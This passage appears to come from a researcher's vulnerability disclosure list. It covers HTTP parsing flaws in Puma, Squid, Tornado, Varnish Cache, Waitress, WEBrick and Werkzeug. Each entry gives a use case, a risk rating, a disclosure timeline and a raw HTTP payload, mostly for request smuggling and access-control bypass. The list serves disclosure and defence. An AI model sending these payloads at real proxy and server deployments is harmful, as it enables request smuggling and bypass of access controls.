  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards empty `Content-Length` header values, and treats them as equivalent to 0.
  - Risk: Medium. See Apache Traffic Server bug 2.
  - Payload: `GET / HTTP/1.1\r\nHost: localhost\r\nContent-Length: \r\n\r\nGET / HTTP/1.1\r\nHost: localhost\r\n\r\n`
  - Timeline:
    - June 16, 2023: Reported via email.
    - July 7, 2023: Followed up via email.
    - August 17, 2023: Fixed in Puma 6.3.1 and 5.6.7. See [advisory](https://github.com/puma/puma/security/advisories/GHSA-68xg-gqqm-vgj8).
2. Puma terminates chunked message bodies on `\r\nXX`, where `XX` can be any two bytes.
  - Use case: Request smuggling
  - Requirements: A transducer that preserves trailer fields and does not add whitespace between the `:` and value within trailer fields. (ATS is one such server)
  - Risk: High. The requirements to exploit this bug do not require the transducer to violate the standards.
  - Payload: `GET / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\nX:POST / HTTP/1.1\r\n\r\n`
  - Timeline:
    - July 31, 2023: Reported via email.
    - August 17, 2023: Fixed in Puma 6.3.1 and 5.6.7. See [advisory](https://github.com/puma/puma/security/advisories/GHSA-68xg-gqqm-vgj8).
    - Assigned CVE-2023-40175.
3. REDACTED
  - Use case: Request smuggling
  - Requirements: REDACTED
  - Risk: High
  - Payload: REDACTED
  - Timeline:
    - February 2, 2024: Reported via email.
    - February 2, 2024: Remains unfixed.

### Squid
1. `Content-Length` values are not validated when a `Transfer-Encoding: chunked` header is present.
  - Use case: ???
  - Requirements: N/A
  - Risk: None.
  - Payload: `POST / HTTP/1.1\r\nHost: a\r\nContent-Length: blahblahblah\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\n0\r\n\r\n`
  - Timeline:
    - February 3, 2024: Reported via [Bugzilla issue](https://bugs.squid-cache.org/show_bug.cgi?id=5338).
    - Feburary 3, 2024: Remains unfixed.

### Tornado
1. The Python `int` constructor is used to parse `Content-Length`s and chunk-sizes, so `_`, `+`, and `-` are misinterpreted.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets `Content-Length`s or chunk-sizes as their longest valid prefix, but forwards them as-is.
  - Risk: Medium. See Apache Traffic Server bug 5.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nTransfer-Encoding: chunked\r\n\r\n0_2e\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\nContent-Length: 5\r\n\r\n0\r\n\r\n`
  - Timeline:
    - August 2, 2023: Reported via [GH security advisory](https://github.com/tornadoweb/tornado/security/advisories/GHSA-qppv-j76h-2rpx).
    - August 10, 2023: Fixed in [commit](https://github.com/tornadoweb/tornado/commit/b7a5dd29bb02950303ae96055082c12a1ea0a4fe).
2. Numerous disallowed characters are incorrectly permitted in header names.
  - Use case: ???
  - Requirements: N/A
  - Risk: None
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nH\x00: value\r\n\r\n`
  - Timeline:
    - August 11, 2023: Reported via [GH issue](https://github.com/tornadoweb/tornado/issues/3310).
    - January 31, 2024: Remains unfixed.
3. `\x00` is incorrectly permitted in header values.
  - Use case: ACL bypass
  - Requirements: A transducer that forwards `\x00` in header values, but only stops header filters at `\x00`.
  - Risk: Medium. See OpenLiteSpeed bug 11 and HAProxy bug 2.
  - Payload: `GET / HTTP/1.1\r\nHost: whatever\r\nH: \x00\r\n\r\n`
  - Timeline:
    - August 11, 2023: Reported via [GH issue](https://github.com/tornadoweb/tornado/issues/3310).
    - January 31, 2024: Remains unfixed.
4. Empty header names are incorrectly permitted.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards `\r\n:\r\n`, and treats it as the end of the header block.
  - Risk: Low. I'm not aware of any such transducer.
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\n: test\r\n\r\n`
  - Timeline:
    - October 13, 2023: Reported via [GH issue comment](https://github.com/tornadoweb/tornado/issues/3310#issuecomment-1761974522).
    - October 15, 2023: Remains unfixed.
5. REDACTED
  - Use case: Request smuggling
  - Requirements: REDACTED
  - Risk: High. REDACTED
  - Payload: REDACTED
  - Timeline:
    - October 7, 2023: Reported via [GH security advisory](https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g).
    - January 31, 2024: Remains unfixed.
6. REDACTED
  - Use case: Request smuggling
  - Requirements: REDACTED
  - Risk: Medium. REDACTED
  - Payload: REDACTED
  - Timeline:
    - February 4, 2024: Reported via [GH security advisory comment](https://github.com/tornadoweb/tornado/security/advisories/GHSA-753j-mpmx-qq6g#advisory-comment-95237).
    - February 4, 2024: Remains unfixed.

### Varnish Cache
1. Whitespace characters are not stripped during HTTP/2 to HTTP/1.1 downgrades.
  - Use case: ???
  - Requirements: H2O is acting as a transducer to an HTTP/1.1 backend.
  - Risk: None
  - Payload: `PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00E\x01\x05\x00\x00\x00\x01\x00\n:authority\tlocalhost\x00\x05:path\x01/\x00\x07:method\x03GET\x00\x07:scheme\x04http\x00\x05test1\x03\ta\t`
  - Timeline:
    - July 7, 2023: Reported via [GH issue](https://github.com/varnishcache/varnish-cache/issues/3952).
    - August 22, 2023: Fixed in [commit](https://github.com/varnishcache/varnish-cache/commit/6af7d972d30371154d9b86943258905e58748ce5).

### Waitress
1. HTTP methods and versions are not validated against the grammar.
  - Use case: ???
  - Requirements: N/A
  - Risk: None.
  - Payload: `\x00 / HTTP/............0596.7407.\r\n\r\n`
  - Timeline:
    - October 17, 2023: Submitted [PR](https://github.com/Pylons/waitress/pull/423).
    - February 4, 2024: Remains unfixed.
2. REDACTED
  - Use case: Request smuggling
  - Requirements: REDACTED
  - Risk: Medium. REDACTED
  - Payload: REDACTED
  - Timeline:
    - February 4, 2024: Reported via email.
    - February 4, 2024: Remains unfixed.

### WEBrick
1. Empty `Content-Length` values are interpreted as equivalent to `0`, and the first `Content-Length` header is prioritized over the second if there are multiple. The interaction of these two bugs allows for request smuggling past a proxy that forwards requests with two `Content-Length` headers, of which the first is empty.
  - Use case: Request smuggling
  - Requirements: A transducer that forwards empty `Content-Length` values before nonempty ones.
  - Risk: High. See HAProxy bug 1.
  - Payload: `GET / HTTP/1.1\r\nContent-Length: \r\nContent-Length: 43\r\n\r\nPOST /evil HTTP/1.1\r\nContent-Length: 18\r\n\r\nGET / HTTP/1.1\r\n\r\n`
  - Timeline:
    - August 14, 2023: Reported via [HackerOne](https://hackerone.com/reports/2110024).
    - August 14, 2023: HackerOne report rejected because WEBrick is out of scope for Ruby's program.
    - August 14, 2023: Reported via [GH issue](https://github.com/ruby/webrick/issues/119).
    - August 15, 2023: Fixed in [PR](https://github.com/ruby/webrick/pull/120).
2. Chunk-sizes are interpreted as their longest valid prefix.
  - Use case: Request smuggling
  - Requirements: A transducer that accepts and forwards `0x`-prefixed chunk-sizes.
  - Risk: High. See OpenBSD relayd bug 3, Pound bug 2, and Akamai bug 2.
  - Payload: `POST / HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0x3a\r\n\r\nGET /evil HTTP/1.1\r\nContent-Length: 23\r\nE: vil\r\nEvil: \r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\n\r\n`
  - Timeline:
    - November 9, 2023: Reported via [GH issue](https://github.com/ruby/webrick/issues/124).
    - January 31, 2024: Remains unfixed.
3. `\x00` is stripped from the ends of header values.
  - Use case: ACL bypass
  - Requirements: A transducer that forwards `\x00` in header values.
  - Risk: Medium. See HAProxy bug 2.
  - Payload: `GET / HTTP/1.1\r\nEvil: evil\x00\r\n\r\n`
  - Timeline:
    - November 30, 2023: Reported via [GH issue](https://github.com/ruby/webrick/issues/126).
    - January 31, 2024: Remains unfixed.

### Werkzeug
1. The `Content-Length` header value is parsed permissively, allowing digit-separating underscores and a `+` prefix.
  - Use case: Request smuggling
  - Requirements: A transducer that interprets `Content-Length` values as their longest valid prefix, but forwards them as-is.
  - Risk: Low. I'm not aware of any vulnerable transducers, but Matt Grenfeldt [says that at least one exists](https://grenfeldt.dev/2021/10/08/gunicorn-20.1.0-public-disclosure-of-request-smuggling/).
  - Payload: `GET / HTTP/1.1\r\nHost: a\r\nContent-Length: +1_0\r\n\r\n0123456789`
  - Timeline:
    - June 1, 2023: Reported via [GH issue](https://github.com/pallets/werkzeug/issues/2716).
    - June 7, 2023: Fixed in [commit 88c5c78](https://github.com/pallets/werkzeug/commit/86c5c78adf0d58b3a0a18b719fe802a19ea78b2c).
